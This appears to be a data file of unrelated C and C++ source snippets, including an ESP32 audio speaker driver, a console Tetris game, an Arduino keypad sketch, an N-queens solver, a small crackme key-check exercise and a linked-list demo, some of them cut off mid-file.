    "#include \"i2s_audio_speaker.h\"\n\n#ifdef USE_ESP32\n\n#include <driver/i2s.h>\n\n#include \"esphome/core/application.h\"\n#include \"esphome/core/hal.h\"\n#include \"esphome/core/log.h\"\n#include \"esphome/core/ring_buffer.h\"\n\n// #include \"esp_dsp.h\" // temporarily added for volume reduction\n\n// Major TODOs:\n//  - optimize buffer sizes/memory used for each task\n//  - handle stereo audio samples\n\nnamespace esphome {\nnamespace i2s_audio {\n\nstatic const size_t SAMPLE_RATE_HZ = 16000;    // 16 kHz\nstatic const size_t RING_BUFFER_LENGTH = 200;  // 0.064 seconds\nstatic const size_t RING_BUFFER_SIZE = SAMPLE_RATE_HZ / 1000 * RING_BUFFER_LENGTH;\nstatic const size_t QUEUE_COUNT = 20;\nstatic const size_t DMA_BUFFER_COUNT = 4;\nstatic const size_t DMA_BUFFER_SIZE = 512;\nstatic const size_t BUFFER_SIZE = DMA_BUFFER_COUNT*DMA_BUFFER_SIZE;\n\nstatic const char *const TAG = \"i2s_audio.speaker\";\n\nvoid I2SAudioSpeaker::setup() {\n  ESP_LOGCONFIG(TAG, \"Setting up I2S Audio Speaker...\");\n\n  this->play_command_queue_ = xQueueCreate(QUEUE_COUNT, sizeof(CommandEvent));\n  this->play_event_queue_ = xQueueCreate(QUEUE_COUNT, sizeof(TaskEvent));\n\n  this->input_ring_buffer_ = RingBuffer::create(RING_BUFFER_SIZE * sizeof(int16_t));\n  if (this->input_ring_buffer_ == nullptr) {\n    ESP_LOGE(TAG, \"Could not allocate ring buffer\");\n    this->mark_failed();\n    return;\n  }\n}\n\nvoid I2SAudioSpeaker::player_task(void *params) {\n  I2SAudioSpeaker *this_speaker = (I2SAudioSpeaker *) params;\n\n  TaskEvent event;\n  CommandEvent command_event;\n\n  event.type = TaskEventType::STARTING;\n  xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n  ExternalRAMAllocator<int16_t> allocator(ExternalRAMAllocator<int16_t>::ALLOW_FAILURE);\n  int16_t *buffer = allocator.allocate(2*BUFFER_SIZE);\n  int16_t *temp_buffer =\n      allocator.allocate(BUFFER_SIZE);  // only adding this to temporarily hardcode a constant volume reduction\n\n  if ((buffer == nullptr) || (temp_buffer == nullptr)) {\n    event.type = TaskEventType::WARNING;\n    event.err = ESP_ERR_NO_MEM;\n    xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n    event.type = TaskEventType::STOPPED;\n    event.err = ESP_OK;\n    xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n    while (true) {\n      delay(10);\n    }\n\n    return;\n  }\n\n  i2s_driver_config_t config = {\n      .mode = (i2s_mode_t) (this_speaker->parent_->get_i2s_mode() | I2S_MODE_TX),\n      .sample_rate = 16000,\n      .bits_per_sample = this_speaker->bits_per_sample_,\n      .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\n      .communication_format = I2S_COMM_FORMAT_STAND_I2S,\n      .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,\n      .dma_buf_count = DMA_BUFFER_COUNT,\n      .dma_buf_len = DMA_BUFFER_SIZE,\n      .use_apll = false,\n      .tx_desc_auto_clear = true,\n      .fixed_mclk = I2S_PIN_NO_CHANGE,\n      .mclk_multiple = I2S_MCLK_MULTIPLE_DEFAULT,\n      .bits_per_chan = I2S_BITS_PER_CHAN_DEFAULT,\n#if SOC_I2S_SUPPORTS_TDM\n      .chan_mask = (i2s_channel_t) (I2S_TDM_ACTIVE_CH0 | I2S_TDM_ACTIVE_CH1),\n      .total_chan = 2,\n      .left_align = false,\n      .big_edin = false,\n      .bit_order_msb = false,\n      .skip_msk = false,\n#endif\n  };\n#if SOC_I2S_SUPPORTS_DAC\n  if (this_speaker->internal_dac_mode_ != I2S_DAC_CHANNEL_DISABLE) {\n    config.mode = (i2s_mode_t) (config.mode | I2S_MODE_DAC_BUILT_IN);\n  }\n#endif\n\n  esp_err_t err = i2s_driver_install(this_speaker->parent_->get_port(), &config, 0, nullptr);\n  if (err != ESP_OK) {\n    event.type = TaskEventType::WARNING;\n    event.err = err;\n    xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n    event.type = TaskEventType::STOPPED;\n    event.err = ESP_OK;\n    xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n    while (true) {\n      delay(10);\n    }\n\n    return;\n  }\n\n#if SOC_I2S_SUPPORTS_DAC\n  if (this_speaker->internal_dac_mode_ == I2S_DAC_CHANNEL_DISABLE) {\n#endif\n    i2s_pin_config_t pin_config = this_speaker->parent_->get_pin_config();\n    pin_config.data_out_num = this_speaker->dout_pin_;\n\n    err = i2s_set_pin(this_speaker->parent_->get_port(), &pin_config);\n#if SOC_I2S_SUPPORTS_DAC\n  } else {\n    err = i2s_set_dac_mode(this_speaker->internal_dac_mode_);\n  }\n#endif\n\n  if (err != ESP_OK) {\n    event.type = TaskEventType::WARNING;\n    event.err = err;\n    xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n    event.type = TaskEventType::STOPPED;\n    event.err = ESP_OK;\n    xQueueSend(this_speaker->play_event_queue_, &event, portMAX_DELAY);\n\n    while (true) {\n      delay(10);\n    }\n\n    return;\n  }\n\n  // Assumes incoming audio stream is mono channel 16000 Hz\n  // TODO: Move everything to stereo streams. Mono to stereo conversion should happen before being written to the\n  // speaker\n  // uint32_t bits_cfg = (this_speaker->bits_per_sample_ << 16) | this_speaker->bits_per_sample_;\n  // err = i2s_set_clk(this_speaker->parent_->get_port(), 16000, bits_cfg, I2S_CHANNEL_MONO);\n\n  event.type = TaskEventType::STARTED;\n  x",
    "#include <iostream>\n#include <ctime>\n#include<fstream>\nusing namespace std;\n\nclass Member\n{\n    public:\n    string name;\n    string dob;\n    string dept;\n    string degree;\n    string session;\n    string emailid;\n    string contact_no;\n    time_t tt;\n    struct tm* ti;\n    Member()\n    {\n        cout<<\"-----ENTER DETAILS IN BLOCK CAPITALS-----\"<<endl;\n        cout<<\"Enter Name: \"<<endl;\n        getline(cin,name);\n        cout<<\"Enter Dob: \"<<endl;\n        getline(cin,dob);\n        cout<<\"Enter Department: \"<<endl;\n        getline(cin,dept);\n        cout<<\"Enter Email-Id: \"<<endl;\n        getline(cin,emailid);\n        cout<<\"Enter Contact Number: \"<<endl;\n        getline(cin,contact_no);\n        cout<<\"Enter Degree Enrolled In (Ex: BTech,BSc...): \"<<endl;\n        getline(cin,degree);\n        cout<<\"Enter Session: \"<<endl;\n        getline(cin,session);\n    }\n    void save()\n    {\n        string copy=name;\n        int c=0;\n        while(c<copy.length())\n        {\n            if(copy[c]==' ')\n            {\n                copy[c]='_';\n            }\n            c++;\n        }\n        string file_name=copy+'_'+dept.substr(0,3);\n        ofstream file(\"Member_Database/\"+file_name+\".txt\"); \n        file<<\"-----MEMBER DETAILS-----\"<<endl;       \n        file<<\"Name: \"<<name<<endl;\n        file<<\"Date of birth: \"<<dob<<endl;\n        file<<\"Enrolled in \"<<degree<<\" \"<<dept<<endl;\n        file<<\"Enrolled for the academic session \"<<session<<endl;\n        time(&tt);\n        ti=localtime(&tt);\n        file<<\"Registerd on \"<<asctime(ti);\n    }\n    void display()\n    {\n        cout<<\"Name: \"<<name<<endl;\n        cout<<\"Date of birth: \"<<dob<<endl;\n        cout<<\"Enrolled in \"<<degree<<\" \"<<dept<<endl;\n        cout<<\"Enrolled for academic session \"<<session<<endl;\n        time(&tt);\n        ti=localtime(&tt);\n        cout<<\"Registerd on \"<<asctime(ti);\n    }\n};\n\nint main()\n{\n    Member m1;\n    m1.save();\n    m1.display();\n    return 0;\n}",
    "/*\n * MIT License\n *\n * Copyright (c) 2024 kiyasui-hito\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n#include \"virtual_machine/gate.hpp\"\n\n\nnamespace Koi {\nnamespace VirtualMachine {\n\nbool Koi::VirtualMachine::Gate::get_exclusive_or(bool x, bool y) {\n    return x ^ y;\n}\n\n\nbool Koi::VirtualMachine::Gate::get_not_or(std::initializer_list<bool> inputs) {\n    if (inputs.size() < 2u) {\n        return false; //fixme:: print error\n    }\n\n    bool result = false;\n\n    auto it = inputs.begin();\n    auto end = inputs.end();\n    while (!result && it != end) {\n        result = *it;\n        ++it;\n    }\n\n    return result;\n}\n\n} // VirtualMachine\n} // Koi\n\n\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <thread>\r\n#include <array>\r\n#include <algorithm>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <mmsystem.h>\r\n#pragma comment(lib, \"winmm.lib\")\r\n\r\nusing namespace std;\r\nint scorelec = 0;\r\nint levellec = 0;\r\n\r\n// \u30c6\u30c8\u30ea\u30df\u30ce\u306e\u5b9a\u7fa9\r\nconst array<string, 7> tetromino = {\r\n    \"..X...X...X...X.\", // I\u578b\r\n    \"..X..XX...X.....\", // T\u578b\r\n    \".....XX..XX.....\", // O\u578b\r\n    \"..X..XX..X......\", // S\u578b\r\n    \".X...XX...X.....\", // Z\u578b\r\n    \".X...X...XX.....\", // L\u578b\r\n    \"..X...X..XX.....\"  // J\u578b\r\n};\r\n\r\n// \u30d5\u30a3\u30fc\u30eb\u30c9\u306e\u30b5\u30a4\u30ba\r\nconst int fieldWidth = 12;\r\nconst int fieldHeight = 18;\r\n\r\n// \u30d5\u30a3\u30fc\u30eb\u30c9\u30af\u30e9\u30b9\r\nclass Field {\r\npublic:\r\n    Field(int width, int height)\r\n        : width(width), height(height), field(width* height, ' ') {\r\n        for (int x = 0; x < width; x++) {\r\n            for (int y = 0; y < height; y++) {\r\n                field[y * width + x] = (x == 0 || x == width - 1 || y == height - 1) ? '#' : ' ';\r\n            }\r\n        }\r\n    }\r\n\r\n    void Draw(HANDLE hConsole, int cursorX, int cursorY) const {\r\n        COORD coord;\r\n        coord.X = cursorX;\r\n        coord.Y = cursorY;\r\n        SetConsoleCursorPosition(hConsole, coord);\r\n        for (int y = 0; y < height; y++) {\r\n\r\n            for (int x = 0; x < width; x++) {\r\n                cout << field[y * width + x];\r\n            }\r\n            cout << endl;\r\n        }\r\n    }\r\n\r\n    char& At(int x, int y) {\r\n        return field[y * width + x];\r\n    }\r\n\r\n    const char& At(int x, int y) const {\r\n        return field[y * width + x];\r\n    }\r\n\r\n    void ClearLine(int y) {\r\n        for (int py = y; py > 0; py--) {\r\n            for (int px = 1; px < width - 1; px++) {\r\n                At(px, py) = At(px, py - 1);\r\n            }\r\n        }\r\n        for (int px = 1; px < width - 1; px++) {\r\n            At(px, 0) = ' ';\r\n        }\r\n    }\r\n\r\n    int ClearLines() {\r\n        int linesCleared = 0;\r\n        for (int y = 0; y < height - 1; y++) {\r\n            if (all_of(field.begin() + y * width + 1, field.begin() + (y + 1) * width - 1, [](char c) { return c != ' '; })) {\r\n                ClearLine(y);\r\n                linesCleared++;\r\n            }\r\n        }\r\n        // \u4e00\u5217\u305d\u308d\u3063\u305f\u6642\u306e\u52b9\u679c\u97f3\r\n        if (linesCleared > 0) {\r\n            thread([]() { mciSendString(L\"play line_clear.wav\", NULL, 0, NULL); }).detach(); // \u884c\u30af\u30ea\u30a2\u97f3\r\n        }\r\n        return linesCleared;\r\n    }\r\n\r\nprivate:\r\n    int width;\r\n    int height;\r\n    vector<char> field;\r\n};\r\n\r\n// \u30c6\u30c8\u30ea\u30df\u30ce\u30af\u30e9\u30b9\r\nclass Tetromino {\r\npublic:\r\n    Tetromino(int type, int rotation, int posX, int posY)\r\n        : type(type), rotation(rotation), posX(posX), posY(posY) {}\r\n\r\n    int Rotate(int px, int py, int rotation) const {\r\n        switch (rotation % 4) {\r\n        case 0: return py * 4 + px;         // 0\u5ea6\r\n        case 1: return 12 + py - (px * 4);  // 90\u5ea6\r\n        case 2: return 15 - (py * 4) - px;  // 180\u5ea6\r\n        case 3: return 3 - py + (px * 4);   // 270\u5ea6\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    bool DoesFit(const Field& field, int newX, int newY, int newRotation) const {\r\n        for (int px = 0; px < 4; px++) {\r\n            for (int py = 0; py < 4; py++) {\r\n                int pi = Rotate(px, py, newRotation);\r\n                int fi = (newY + py) * fieldWidth + (newX + px);\r\n                if (newX + px >= 0 && newX + px < fieldWidth && newY + py >= 0 && newY + py < fieldHeight) {\r\n                    if (tetromino[type][pi] == 'X' && field.At(newX + px, newY + py) != ' ')\r\n                        return false;\r\n                }\r\n                else {\r\n                    return false;\r\n                }\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    bool DoesFit(const Field& field) const {\r\n        return DoesFit(field, posX, posY, rotation);\r\n    }\r\n\r\n    void PlaceOnField(Field& field) const {\r\n        for (int px = 0; px < 4; px++) {\r\n            for (int py = 0; py < 4; py++) {\r\n                if (tetromino[type][Rotate(px, py, rotation)] == 'X') {\r\n                    field.At(posX + px, posY + py) = 'X';\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    void Draw(Field& field, HANDLE hConsole, int cursorX, int cursorY) const {\r\n        for (int px = 0; px < 4; px++) {\r\n            for (int py = 0; py < 4; py++) {\r\n                if (tetromino[type][Rotate(px, py, rotation)] == 'X') {\r\n                    COORD coord;\r\n                    coord.X = cursorX + posX + px;\r\n                    coord.Y = cursorY + posY + py;\r\n                    SetConsoleCursorPosition(hConsole, coord);\r\n                    cout << 'O';\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    void Move(int dx, int dy) {\r\n        posX += dx;\r\n        posY += dy;\r\n    }\r\n\r\n    void RotateClockwise(const Field& field) {\r\n        int newRotation = (rotation + 1) % 4;\r\n        if (DoesFit(field, posX, posY, newRotation)) {\r\n            rotation = newRotation;\r\n        }\r\n    }\r\n\r\n    int GetX() const { return posX; }\r\n    int GetY() const { return posY; ",
    "#define TFT_MISO 22\n#define TFT_MOSI 23\n#define TFT_CLK 24\n#define RD A3\n\n\n\n\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n//             DISPLAY SETUP STUFF\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n#include \"SPI.h\"\n#include \"Adafruit_GFX.h\"\n#include \"Adafruit_ILI9341.h\"\n#define TFT_DC A4 //other documentation calls this \"write\" or WR\n#define TFT_CS A5\nAdafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC);\n//Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_MOSI, TFT_CLK, 9, TFT_MISO);\n#define BLACK ILI9341_BLACK\n#define BACKGROUND 0x950f\n\n\n\n\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n//             KEYBOARD SETUP STUFF\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n#define keyboardSense A2\n//TODO: Rename these variables to something that's not deceptive.\n#define colA 10\n#define colB 6\n#define colC 5\n\n#define rowA 11\n#define rowB 12\n#define rowC 13\n\n//This array is here to convert between the nonsense row/col pin values into something human-comprehendable.\nconst byte keyNumLookup[8][8] = {{34, 24, 14, 44, 85, 54, 75, 65},\n                          {35, 25, 15, 45, 86, 55, 76, 66},\n                          {11, 00, 00, 00, 00, 00, 00, 00},\n                          {33, 23, 13, 43, 84, 53, 74, 64},\n                          {91, 00, 00, 92, 96, 93, 95, 94},\n                          {32, 22, 12, 42, 83, 52, 73, 63},\n                          {00, 00, 00, 00, 81, 00, 71, 61},\n                          {31, 21, 00, 41, 82, 51, 72, 62}};\n\n\n\n\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n//             MISC SETUP STUFF\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n#define selfEnabler A1\n#define SDA 20\n#define SCL_I2C 21\n\n#define serial_debug 1\n\nenum Mode {\n  MODE_ENTRY,\n  MODE_ERROR,\n  MODE_IDLE,\n  MODE_PROCESSING,\n  MODE_MENU\n};\n\nenum FunctionKeyDumps {\n  F_UNIT\n}\n\nstruct {\n  string lineEntry = \"\";\n  Mode mode = MODE_PROCESSING;\n  byte[4] FunctionKeyState = {0,0,0,0};\n  MyStack stack;\n  \n} machineState;\n\n\n\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n//             MAIN SETUP FUNCTION\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\nvoid setup() {\n  //First, make sure we keep the lights on\n  pinMode(selfEnabler, OUTPUT);\n  digitalWrite(selfEnabler,HIGH);\n\n  //Setup the keyboard sense pins\n  pinMode(rowA, OUTPUT);\n  pinMode(rowB, OUTPUT);\n  pinMode(rowC, OUTPUT);\n  pinMode(colA, OUTPUT);\n  pinMode(colB, OUTPUT);\n  pinMode(colC, OUTPUT);\n  pinMode(keyboardSense, INPUT);\n\n  //Start talking\n  #ifdef serial_debug\n    Serial.begin(9600);\n  #endif\n\n\n  //Get the display setup, blank out border regions, and display the backgound color.\n  tft.begin();\n  tft.setRotation(3);\n  tft.fillRect(0,0,320,6,BLACK);\n  tft.fillRect(294,0,26,240,BLACK);\n  tft.fillRect(0,229,320,10,BLACK);\n  tft.fillRect(0,6,294,223,BACKGROUND);\n  tft.setTextColor(BLACK,BACKGROUND);\n  tft.setTextSize(1);\n\n\n\n\n\n//This function returns the human-readable key number. If no key is pressed, returns zero.\nint pollKeyboard() {\n  byte row = 0;\n  byte col = 0;\n  while(row<8) {\n    while (col<8) {\n      digitalWrite(rowA,bitRead(row,0));\n      digitalWrite(rowB,bitRead(row,1));\n      digitalWrite(rowC,bitRead(row,2));\n      digitalWrite(colA,bitRead(col,0));\n      digitalWrite(colB,bitRead(col,1));\n      digitalWrite(colC,bitRead(col,2));\n      delayMicroseconds(10);\n      if(digitalRead(keyboardSense)==HIGH) {\n        return keyNumLookup[row][col];\n      }\n      if(row==2) {break;} //This is needed because row 2 only has one key in it, so we need to kill the loop at the first iteration\n      col=col+1;\n    }\n    col=0;\n    row=row+1;\n  }\n  row=0;\n  return 0;\n}\n\n\n\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n//             MAIN LOOP FUNCTION\n//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\nvoid loop() {\n  tft.setTextSize(3);\n  tft.setCursor(50,50);\n  tft.println(String(pollKeyboard()));\n}",
    "#include <iostream>\n#include <vector>\n\n#define N 8\n\nvoid printBoard(const std::vector<std::vector<int>>& board) {\n    for (int i = 0; i < N; ++i) {\n        for (int j = 0; j < N; ++j) {\n            std::cout << (board[i][j] == 1 ? \"Q \" : \". \");\n        }\n        std::cout << std::endl;\n    }\n}\n\nbool isSafe(const std::vector<std::vector<int>>& board, int row, int col) {\n    // Check the column\n    for (int i = 0; i < row; ++i) {\n        if (board[i][col] == 1) {\n            return false;\n        }\n    }\n\n    // Check the upper left diagonal\n    for (int i = row, j = col; i >= 0 && j >= 0; --i, --j) {\n        if (board[i][j] == 1) {\n            return false;\n        }\n    }\n\n    // Check the upper right diagonal\n    for (int i = row, j = col; i >= 0 && j < N; --i, ++j) {\n        if (board[i][j] == 1) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nbool solveNQueens(std::vector<std::vector<int>>& board, int row) {\n    if (row == N) {\n        return true;\n    }\n\n    for (int col = 0; col < N; ++col) {\n        if (isSafe(board, row, col)) {\n            board[row][col] = 1;\n\n            if (solveNQueens(board, row + 1)) {\n                return true;\n            }\n\n            board[row][col] = 0; // backtrack\n        }\n    }\n\n    return false;\n}\n\nint main() {\n    std::vector<std::vector<int>> board(N, std::vector<int>(N, 0));\n\n    if (solveNQueens(board, 0)) {\n        printBoard(board);\n    } else {\n        std::cout << \"No solution exists\" << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <windows.h>\r\n#include <string>\r\n#include <cstdlib>\r\nvoid konsolpatlatici31(){\r\n\tsystem(\"cls\");\r\n}bool zz=false;\r\nvoid www() {\r\n    if(zz==true){konsolpatlatici31();\r\n        std::cout << \"--------------------\\n\"\r\n        << \"|   CORRECT KEY!!  |\\n\"\r\n        << \"--------------------\\n\";\r\n        system(\"pause > nul\");\r\n        std::cout << \"press any key to exit..\";\r\n        system(\"pause > nul\");\r\n    }else {\r\n\tkonsolpatlatici31();\r\n        std::cout << \"nice try xd\\n\";\r\n\tstd::cout << \"press any key to exit..\";\r\n\tsystem(\"pause > nul\");\r\n        std::exit(0);\r\n    }\r\n}\r\nstd::string printfln3(const std::string& input, int mucize_doktor) {\r\n    std::string TURKIYEEEEEE_AUAUUAUUAUUAUUAAUAU = input;\r\n    for (char& c : TURKIYEEEEEE_AUAUUAUUAUUAUUAAUAU) {\r\n        if (std::isdigit(c)) {\r\n            c=(c-'0'+mucize_doktor)%10+'0';\r\n        }\r\n    }return TURKIYEEEEEE_AUAUUAUUAUUAUUAAUAU;\r\n}\r\nstd::string printfln33(const std::string& input, int mucize_doktor) {\r\n    return printfln3(input, 10 - mucize_doktor);\r\n}\r\nvoid print(const std::string& str){std::cout << str;}\r\nint main() {\r\n    SetConsoleTitleA(\"bxtumations crackme\");\r\n    print(\"please enter the key:\\n\");\r\n    std::string inp;\r\n    std::string messi333333 = \"331\";\r\n    int mucize_doktor = 22;\r\n    std::string messi3333333 = printfln3(messi333333, mucize_doktor);\r\n    while (true) {\r\n        std::cin >> inp;\r\n        if (inp == messi3333333) {zz=true;break;\r\n        } else {\r\n\t    konsolpatlatici31();\r\n            print(\"wrong key!!\");\r\n\t    print(\"\\ntry again :))\\n\");\r\n        }\r\n\t}\r\n\twww();\r\n    return 0;\r\n}\r\n",
    "#include \"game.hpp\"\n#include <SFML/System/Vector2.hpp>\n#include <SFML/System/Vector3.hpp>\n#include <SFML/Window/Keyboard.hpp>\n#include <SFML/Window/VideoMode.hpp>\n#include <SFML/Window/Window.hpp>\n#include <SFML/Window/WindowStyle.hpp>\n\nvoid blocklike::Game::loop() {\n\twhile(window.isOpen()) {\n\t\tpollEvents();\n\t\tupdate();\n\t\tdraw();\n\t}\n}\n\nvoid blocklike::Game::stopGame() {\n\tlogger.print(\"Closing game\\n\");\n\t\n\twindow.close();\n}\n\nvoid blocklike::Game::startGame() {\n\t// Creating Logger\n\tlogger = blocklike::Logger();\n\n\t// Setting up window\n\tlogger.print(\"Setting up window\\n\");\n\twindow.create(sf::VideoMode(1280, 720), \"Blocklike\", sf::Style::Titlebar | sf::Style::Close);\n\twindow.setPosition(sf::Vector2i());\n\twindow.setMouseCursorVisible(false);\n\n\t// Loading font\n\tlogger.print(\"Loading font\\n\");\n\tif(!mainFont.loadFromFile(\"assets/fonts/main.ttf\")) {\n\t\tlogger.print(\"Couldn't find main font at: ./assets/fonts/main.ttf\\n\");\n\n\t\treturn;\n\t}\n\n\t// Setting framerate limit\n\tlogger.print(\"Setting framerate limit to 60\\n\");\n\twindow.setFramerateLimit(60);\n\n\t// Setting up keys vector\n\tlogger.print(\"Reserving space for keysDown vector\");\n\tfor(int i = 0; i < sf::Keyboard::KeyCount; i++) keysDown.push_back(false);\n\n\t// Creating player\n\tlogger.print(\"Creating player\\n\");\n\tplayer = blocklike::Player();\n\n\t// Creating test blocks\n\tlogger.print(\"Creating test block(s)\\n\");\n\t//blocks.push_back(Block(0, 0, 0));\n\tfor(int z = -10; z < 10; z++) {\n\t\tfor (int x = -10; x < 10; x++) {\n\t\t\tint currY = 0;\n\n\t\t\twhile(currY < 5) {\n\t\t\t\tblocks.push_back(Block(x, currY, z));\n\t\t\t\t\n\t\t\t\tcurrY++;\n\t\t\t}\n\t\t}\n\t}\n\n\t// Starting game loop\n\tlogger.print(\"Starting game loop\\n\");\n\tloop();\n}",
    "#include \"tensor.h\"\n#include \"get_slice.h\"\n#include \"set_slice.h\"\n#include \"set_children.h\"\n#include \"change_dtype.h\"\n#include \"operation_tests.h\"\n#include \"matmul.h\"\n#include \"reshape.h\"\n#include \"stacking.h\"\n#include \"bench_ops.h\"\n#include \"matmul_benchmark.h\"\n#include \"at_mul_test.h\"\n#include \"dataloading.h\"\n#include \"embed_tests.h\"\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        std::cout << \"Provide a test number (1 for get_slice, 2 for set_slice)\" << std::endl;\n        return 1;\n    }\n\n    int test_num = std::stoi(argv[1]);\n    switch (test_num) {\n        case 1:\n            std::cout << \"Running get_slice test...\" << std::endl;\n            test_get_slice();\n            break;\n        case 2:\n            std::cout << \"Running set_slice test...\" << std::endl;\n            test_set_slice();\n            break;\n        case 3:\n            std::cout << \"Running set_chilren test...\" << std::endl;\n            test_set_children();\n            break;\n        case 4:\n            std::cout << \"Running change_dtype test...\" << std::endl;\n            test_change_dtype();\n            break;\n        case 5:\n            std::cout << \"Running operations test...\" << std::endl;\n            generate_test_cases();\n            break;\n        case 6:\n            std::cout << \"Running matmul test...\" << std::endl;\n            matmul_tests();\n            break;\n        case 7:\n            std::cout << \"Running reshape test...\" << std::endl;\n            test_reshape();\n            break;\n        case 8:\n            std::cout << \"Running stacking test...\" << std::endl;\n            test_stack();\n            break;\n        case 9:\n            std::cout << \"Running Benchmark test for simple ops(CUDA vs CPU)...\" << std::endl;\n            benchmarkTensorOperations(100000000);\n            break;\n        case 10:\n            std::cout << \"Running Benchmark test for matmul(CUDA vs CPU)...\" << std::endl;\n            benchmark_matmul();\n            break;\n        case 11:\n            std::cout << \"Running Tests for Atomic mult(CUDA)...\" << std::endl;\n            testAtomicMulTensor();\n            break;\n        case 12:\n            std::cout << \"Testing the text-to-ids function...\" << std::endl;\n            test_dataloader();\n            break;\n        case 13:\n            std::cout << \"Testing the embeddings function...\" << std::endl;\n            test_embeddings();\n            break;\n\n        default:\n            std::cout << \"Invalid test number.\" << std::endl;\n            return 1;\n    }\n\n    return 0;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n struct Node\n{\n    /* data */\n    int data;\n     Node *next;\n};\nNode* inserAtFirst(Node *head,int data)\n{\n    Node *ptr=(Node*)malloc(sizeof(Node));\n    ptr->next=head;\n    ptr->data=data;\n    return ptr;\n}\nNode* insertAtIndex(Node* head,int data,int index){\n    Node *ptr=(Node*)malloc(sizeof(Node));\n    Node *p=head;\n    int i=0;\n    while(i!=index-1){\n        p=p->next;\n        i++;\n    }\n    ptr->data=data;\n    ptr->next=p->next;\n    p->next=ptr;\n    return head;\n}\nNode* insertAtEnd(Node* head,int data)\n{\n    Node *ptr=(Node*)malloc(sizeof(Node));\n    Node *p=head;\n    while(p->next!=NULL){\n        p=p->next;\n    }\n    ptr->data=data;\n    p->next=ptr;\n    ptr->next=NULL;\n    return head;\n\n}\nvoid traverse(Node *ptr)\n{while(ptr->next!=NULL)\n   { cout<<\"Element: \"<<ptr->data<<endl;\n    ptr=ptr->next;}\n}\n\nint main()\n{\n     Node *head;\n     Node *second;\n     Node *third;\n     Node *fourth;\n     Node *third_2;\n    // allocated memory in heap\n    head= ( Node*)malloc(sizeof( Node));\n    second= ( Node*)malloc(sizeof( Node));\n    third= ( Node*)malloc(sizeof( Node));\n    fourth=(struct Node*)malloc(sizeof(struct Node));\n    third_2=( Node*)malloc(sizeof( Node));\n    head->data=7;\n    head->next=second;\n    second->data=11;\n    second->next=third;\n    third->data=13;\n    third->next=fourth;\n    fourth->data=34;\n    fourth->next=NULL;\n    head=inserAtFirst(head,545);\n    traverse(head);\n    cout<<endl;\n    head=insertAtIndex(head,64,2);\n    traverse(head);\n    cout<<endl;\n    head=insertAtEnd(head,90);\n    traverse(head);\n    return 0;\n\n\n}",
    "/******************************************************************************\n *\n *\n *  Copyright (C) 2015 NXP Semiconductors\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *  http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n *\n ******************************************************************************/\n#define LOG_TAG \"EseAdaptation\"\n#include <android/hardware/secure_element/1.0/ISecureElement.h>\n#include <android/hardware/secure_element/1.0/ISecureElementHalCallback.h>\n#include <android/hardware/secure_element/1.0/types.h>\n#include <hwbinder/ProcessState.h>\n#include <pthread.h>\n#include \"EseAdaptation.h\"\n#include <log/log.h>\n\nusing android::hardware::Return;\nusing 